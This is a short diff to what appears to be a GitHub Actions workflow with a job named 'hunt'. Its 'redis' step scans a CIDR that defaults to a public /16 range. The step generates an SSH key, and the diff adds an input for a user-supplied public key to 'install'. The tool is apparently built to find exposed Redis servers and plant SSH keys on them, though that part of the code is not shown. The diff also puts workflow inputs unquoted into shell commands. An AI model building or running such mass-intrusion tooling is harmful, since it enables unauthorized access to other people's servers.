@@ -7,6 +7,10 @@ on:
         description: CIDR
         required: true
         default: 192.3.0.0/16
+      pubkey:
+        description: SSH public key to install
+        required: false
+        default: ""
 
 jobs:
   hunt:
@@ -17,6 +21,9 @@ jobs:
       - name: redis
         run: |
           ssh-keygen -t ed25519 -f /tmp/k -N "" -q
+          PUBKEY="${{ inputs.pubkey }}"
+          if [ -n "$PUBKEY" ]; then printf '%s
+' "$PUBKEY" > /tmp/k.pub; fi
           CIDR="${{ inputs.cidr }}" python3 - <<'PY'
           import asyncio
           import ipaddress
